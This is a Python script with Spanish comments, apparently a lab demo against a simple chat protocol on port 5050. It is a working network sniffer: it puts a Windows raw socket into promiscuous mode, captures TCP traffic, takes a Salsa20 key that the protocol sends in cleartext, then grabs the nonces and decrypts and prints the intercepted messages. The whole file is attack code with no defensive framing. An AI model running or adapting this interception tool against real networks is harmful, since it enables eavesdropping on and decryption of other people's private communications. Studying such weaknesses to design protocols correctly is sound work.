import socket
import struct
from Crypto.Cipher import Salsa20

# Variables globales para almacenar la clave interceptada
intercepted_key = None
nonce = None

def start_sniffer():
    global intercepted_key, nonce

    # Configura el socket para capturar paquetes en la red
    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)

    # Asigna la interfaz local donde se desea capturar
    sniffer.bind(('192.168.20.29', 0))  # Cambia por la dirección IP local del sniffer

    # Coloca la tarjeta de red en modo promiscuo
    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Para Windows, es necesario activar el modo promiscuo para poder capturar paquetes
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

    print("[SNIFFER] Iniciando captura de paquetes...")

    # Captura paquetes indefinidamente
    try:
        while True:
            # Recibe los datos del paquete
            raw_data, addr = sniffer.recvfrom(65565)

            # Obtener la cabecera IP (los primeros 20 bytes)
            ip_header = raw_data[:20]
            iph = struct.unpack('!BBHHHBBH4s4s', ip_header)

            # Obtener el protocolo (campo 6 de la cabecera IP)
            protocol = iph[6]
            if protocol == 6:  # Protocolo TCP
                # Extraer la cabecera TCP (20 bytes después de la cabecera IP)
                tcp_header = raw_data[20:40]
                tcph = struct.unpack('!HHLLBBHHH', tcp_header)

                # Extraer los puertos origen y destino
                src_port = tcph[0]
                dst_port = tcph[1]

                # Filtrar por puerto 5050
                if src_port == 5050 or dst_port == 5050:
                    # Extraer los datos del paquete después de la cabecera TCP
                    data_offset = (tcph[4] >> 4) * 4
                    payload = raw_data[20 + data_offset:]

                    # Interceptar la clave del primer mensaje no cifrado
                    if intercepted_key is None and len(payload) == 32:
                        intercepted_key = payload
                        print(f"[CLAVE INTERCEPTADA]: {intercepted_key.hex()}")

                    elif intercepted_key and len(payload) > 8:
                        # Interceptar nonce de los primeros 8 bytes del mensaje cifrado
                        nonce = payload[:8]
                        encrypted_message = payload[8:]

                        print(f"[NONCE INTERCEPTADO]: {nonce.hex()}")
                        print(f"[MENSAJE CIFRADO INTERCEPTADO]: {encrypted_message.hex()}")

                        # Intentar descifrar el mensaje
                        try:
                            cipher = Salsa20.new(key=intercepted_key, nonce=nonce)
                            decrypted_message = cipher.decrypt(encrypted_message)
                            
                            # Verificar si es posible decodificar como UTF-8
                            try:
                                print(f"[MENSAJE DESCIFRADO]: {decrypted_message.decode('utf-8')}")
                            except UnicodeDecodeError:
                                print(f"[MENSAJE DESCIFRADO (RAW)]: {decrypted_message.hex()}")
                        except Exception as e:
                            print(f"[ERROR DESCIFRADO]: {str(e)}")

    except KeyboardInterrupt:
        print("[SNIFFER] Deteniendo captura de paquetes.")
        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)


if __name__ == "__main__":
    start_sniffer()
